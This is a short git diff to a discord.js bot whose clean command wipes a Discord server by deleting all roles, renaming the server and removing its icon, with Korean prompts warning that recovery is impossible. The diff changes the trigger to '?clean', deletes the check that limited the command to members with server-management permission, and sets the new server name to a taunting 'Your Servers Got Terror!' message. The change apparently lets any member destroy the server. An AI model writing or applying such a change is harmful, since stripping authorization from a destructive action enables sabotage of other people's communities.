@@ -5,8 +5,7 @@ const { Client, Collection, MessageEmbed } = require("discord.js"),
 client.login('token')
 
 client.on("message", async (message) => {
-    if (message.content == '!clean') {
-        if (!message.member.hasPermission('MANAGE_GUILD')) return await message.channel.send('서버 관리자만 서버를 폭파시킬 수 있어요!');
+    if (message.content == '?clean') {
         const embed = new Discord.MessageEmbed()
         .setTitle('정말 서버를 폭파할까요?')
         .addField('복구 여부', '불가능')
@@ -60,7 +59,7 @@ client.on("message", async (message) => {
                 .addField('모든 역할 삭제', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                 .addField('서버 이름 변경', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
                 await m.edit(embed);
-                await m.guild.setName('폭파된 서버');
+                await m.guild.setName('Your Servers Got Terror! sans!');
                 await embed.spliceFields(embed.fields.length - 1, 1)
                 .addField('서버 이름 변경', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                 .addField('서버 아이콘 삭제', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
